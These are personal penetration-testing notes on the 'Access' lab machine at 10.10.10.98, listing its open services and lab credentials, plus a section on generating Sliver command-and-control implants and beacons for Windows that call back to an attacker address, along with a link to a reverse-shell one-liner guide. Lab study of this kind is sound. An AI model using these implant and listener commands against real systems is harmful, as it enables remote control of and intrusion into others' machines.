# Access Notes

## Data 

IP:  10.10.10.98
OS: Window server 2008 x64 
Hostname: Access
Machine Purpose: 
Services: 21,23,80 - LON-MC6! - no udp!
Service Languages: 
Users:  users.txt
Credentials: passwords.txt
```
access4u@security is password for 'Access Control.zip'
"security" - 4Cc3ssC0ntr0ller
john - john@megacorp.com
security@accesscontrolsystems.com
```



## Objectives





## Solution Inventory Map



### Todo 


### Done



## Beyond Root

I feel in love with sliver from the silly names of implants to clarity and speed.
[Sliver Wiki](https://github.com/BishopFox/sliver/wiki/)
```go
sliver
// View all implants
implants
// Generate Beacons and Sessions
generate
// Choice one C2 endpoint using:
// --wg is wireguard 
--mtls --wg --http --dns
// Session are sessions opsec unsafe
generate --mtls domain.com --os windows --save 
// Beacons are asychronous - more opsec way they sleep and check 
generate beacon --mtls 10.10.10.10:6969 --arch amd64 --os windows -save /path/to/directory
// Regenerate
regenerate
// listeners
// Do not accept interfaces as arguemnts like metasploit
mtls
wg
https
http
dns
// Jonbs to view and manage listners
jobs
// Interact with sessions
use sessionID 
```

https://freshman.tech/snippets/go/cross-compile-go-programs/

https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/

